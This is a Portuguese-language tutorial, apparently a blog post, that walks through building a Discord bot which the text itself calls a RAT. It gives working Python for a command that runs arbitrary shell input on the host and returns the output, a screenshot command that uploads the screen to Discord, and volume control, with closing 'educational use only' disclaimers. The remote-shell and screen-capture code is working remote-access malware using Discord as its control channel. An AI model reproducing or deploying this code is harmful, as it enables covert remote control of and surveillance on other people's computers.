# Criando um bot para o Discord

Um bot do Discord pode ser utilizado como uma ponte para executar comandos no seu computador local, funcionando como uma espécie de RAT. Aqui está um passo a passo como criar um bot no Discord e usá-lo para controle remoto.

## Passo 1 - Criar o bot no Discord

1. Acesse o [Portal de Desenvolvedores do Discord](https://discord.com/developers/applications).
2. Clique em **"New Application"**.
3. Dê um nome à sua aplicação e clique em **Create**.
4. No menu lateral, vá até **Bot** e clique em **Add Bot** > **Yes, do it!**.
5. Agora, você terá acesso ao **Token do Bot**. **Copie este token**, pois ele será usado no código.

> **Importante:** NUNCA compartilhe o token do seu bot! Com ele, qualquer pessoa poderá controlar seu bot, então tome cuidado com quem você o manda.

## Passo 2 - Definir permissões e convidar o bot

1. No menu lateral, vá até **OAuth2 > URL Generator**.
2. Selecione:
   - **Scopes:** bot
   - **Bot Permissions:** Administrator (ou personalize de acordo com as funções que o bot executará)
3. Copie a URL gerada, cole no navegador e adicione o bot ao seu servidor do Discord.

Isso é necessário para que o bot consiga operar de acordo com as restrições do Discord.

## Passo 3 - Estrutura básica do bot

Vamos começar fazendo uma estrutura básica para o bot. Sem funcionalidades específicas no momento, só vamos garantir que ele funciona.

Aqui está a base de um bot que executa comandos no seu computador local. Tente ler e entender o que cada trecho faz.

```py
import discord
from discord.ext import commands
import os
import subprocess

prefix = "!"
token = 'SEU_TOKEN_AQUI'  # Substitua pelo token do seu bot

bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all(), help_command=None)

@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user}')

@bot.command(name='shell', help='Executa um comando no terminal')
async def shell(ctx, *, command: str):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    output = result.stdout if result.stdout else result.stderr
    await ctx.send(f"```{output}```")

bot.run(token)
```

## Passo 4 - Adicionando mais funcionalidades

Vamos começar a implementar alguns comandos para codar nosso RAT!

### Captura de Tela:

```py
from mss import mss

@bot.command(name='screenshot', help='Tira um screenshot da tela')
async def screenshot(ctx):
    with mss() as sct:
        sct.shot(output='screenshot.png')
    await ctx.send(file=discord.File('screenshot.png'))
    os.remove('screenshot.png')
```

### Controle de Volume:

```py
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

def volumeup():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

@bot.command(name='volumeup', help='Aumenta o volume do sistema')
async def volume_up(ctx):
    volumeup()
    await ctx.send("Volume aumentado ao máximo.")
```

## Passo 5 - Executando o bot

Salve o script em um arquivo `.py` e execute:

```bash
python seu_bot.py
```

Assim que o bot estiver online, você poderá interagir com ele no canal do Discord do seu servidor.

## Considerações finais

Este bot e tutorial são para fins educacionais e demonstram como é possível controlar um computador local via Discord. Usos maliciosos são ilegais e contra os Termos de Serviço do Discord. Não preciso nem mencionar que vocês são adultos teoricamente responsáveis, preciso?

> **DISCLAIMER:** Utilize este conhecimento de maneira ética e responsável. O uso indevido pode acarretar sérias consequências legais.
